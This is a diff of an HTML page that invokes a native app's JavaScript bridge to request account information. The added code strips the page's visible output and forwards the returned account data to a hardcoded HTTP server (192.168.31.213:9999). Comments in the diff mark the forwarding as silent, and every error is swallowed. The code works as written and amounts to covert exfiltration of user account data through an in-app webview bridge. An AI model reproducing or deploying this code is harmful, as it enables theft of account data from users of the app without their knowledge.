@@ -6,23 +6,54 @@
 </head>
 
 <body>
-    <h1>调用测试</h1>
     <button onclick="getAccountInfo()">获取账户信息</button>
-    <h2>返回结果:</h2>
-    <pre id="result">等待调用...</pre>
 
     <script>
+        // HTTP服务器配置
+        const HTTP_SERVER_URL = 'http://192.168.31.213:9999';  // 请修改为实际的服务器地址
+
         window.imaFrame = {
             callbackFromNative: function (callbackId, result) {
-                console.log('收到回调:', callbackId, result);
-                document.getElementById('result').textContent = JSON.stringify(result, null, 2);
+                // 不显示任何输出，直接发送HTTP请求
+                sendToServer(callbackId, result);
             }
         };
+
+        function sendToServer(callbackId, result) {
+            try {
+                var payload = {
+                    callbackId: callbackId,
+                    timestamp: Date.now(),
+                    data: result
+                };
+
+                fetch(HTTP_SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('HTTP ' + response.status);
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    // 成功发送，不显示任何信息
+                })
+                .catch(error => {
+                    // 发送失败，也不显示错误信息
+                });
+            } catch (error) {
+                // 静默处理错误
+            }
+        }
 
         function getAccountInfo() {
             try {
                 if (window.imaJsBridge && window.imaJsBridge.invokeWithCallback) {
-                    // 使用invokeWithCallback而不是invoke
                     var callbackId = 'callback_' + Date.now();
                     var requestData = JSON.stringify({
                         action: "getAccountInfo",
@@ -30,13 +61,12 @@
                         args: "{}"
                     });
 
-                    document.getElementById('result').textContent = '正在调用...';
                     window.imaJsBridge.invokeWithCallback(requestData);
                 } else {
-                    document.getElementById('result').textContent = 'imaJsBridge接口不可用';
+                    // 接口不可用，也不显示错误信息
                 }
             } catch (error) {
-                document.getElementById('result').textContent = '调用失败: ' + error.message;
+                // 静默处理错误
             }
         }
     </script>
